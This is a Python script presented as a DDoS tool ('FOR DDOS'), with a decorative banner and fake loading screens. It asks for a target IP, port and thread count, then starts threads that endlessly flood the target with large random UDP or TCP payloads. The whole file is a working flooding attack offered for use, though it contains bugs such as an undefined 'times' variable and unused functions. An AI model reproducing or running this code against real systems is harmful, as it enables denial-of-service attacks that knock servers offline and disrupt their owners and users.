#Tools : Ernest
#Team : METRO-BOY

import random
import socket
import os
import threading
import sys
import time

ask =input("Name You : ")
os.system("clear")

print("""   UDP  -  OVH | Ernest | FOR DDOS 
_____________________________________
             UDP [ Y ]                  
_____________________________________
     Hi Welcome To Tools ERNEST !!
_____________________________________
             OVH [ N ]                 
_____________________________________  """)


choice = str(input(" UDP OR OVH ? : "))

print("""[ ! ] : Done !!""")
time.sleep(1.0)
os.system("clear")

os.system("clear")
print("[•]Loading•")
time.sleep(1.0)
os.system("clear")
print("[•]Loading••")
time.sleep(1.0)
os.system("clear")
print("[•]Loading•••")
time.sleep(1.0)
os.system("clear")

os.system("clear")
print("[•]Loading•")
time.sleep(1.0)
os.system("clear")
print("[•]Loading••")
time.sleep(1.0)
os.system("clear")
print("[•]Loading•••")
time.sleep(1.0)
os.system("clear")
print("Done !!")
time.sleep(1.0)
os.system("clear")


ip =str(input("\033[32m >>> \033[24m Ip : "))
print("Waiting Check Ip Server")
time.sleep(2.0)
os.system("clear")
port =int(input("\033[32m >>> \033[24m Port : "))
print("Waiting check Port Server")
time.sleep(2.0)
os.system("clear")
time =int(input("\033[32m >>> \033[24m Time : "))
print("Waiting")
os.system("clear")
threads =int(input("\033[32m >>> \033[24m Sent  : "))
print("Waiting")
os.system("clear")

print("""\033[35m
______________________________________
 ___________ _   _  _____ _____ _____ 
|  ___| ___ \ \ | ||  ___/  ___|_   _|
| |__ | |_/ /  \| || |__ \ `--.  | |  
|  __||    /| . ` ||  __| `-.  \ | |  
| |___| |\ \| |\  || |___/\__/ / | |  
\____/\_| \_\_| \_/\____/\____/  \_/                  
______________________________________
""")
ask =input("start | no : ")

os.system("clear")
def run():
	data = random._urandom(65500)
	i = random.choice(("[Fine !!]","[Denied !!]","[Work !!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[32mSent Attack For Ip\033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
		except:
			s.close()
			print("\033[91m                \u001b[32mSERVER IS OFFLINE BACK TRACK [ ! ]\033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))

def run2():
	data = random._urandom(818)
	i = random.choice(("[Fine !!]","[Denied !!]","[Work !!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[32mSent Attack For Ip\033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
		except:
			s.close()
			print("\033[91mSERVER IS OFFLINE BACK TRACK\u001b[32m [!]\033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))

def run3():
	data = random._urandom(666)
	i = random.choice(("[Fine !!]","[Denied !!]","[Work !!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[32mSent Attack For Ip\033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
		except:
			s.close()
			print("\033[91mSERVER IS OFFLINE BACK TRACK\u001b[32m [!]\033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))

def run4():
	data = random._urandom(9999)
	i = random.choice(("[Fine !!]","[Denied !!]","[Work !!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[32mSent Attack For Ip\033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
		except:
			s.close()
			print("\033[91mSERVER IS OFFLINE BACK TRACK\u001b[32m [!]\033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

for n in range(threads):
	if choice == 'n':
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run)
		th.start()
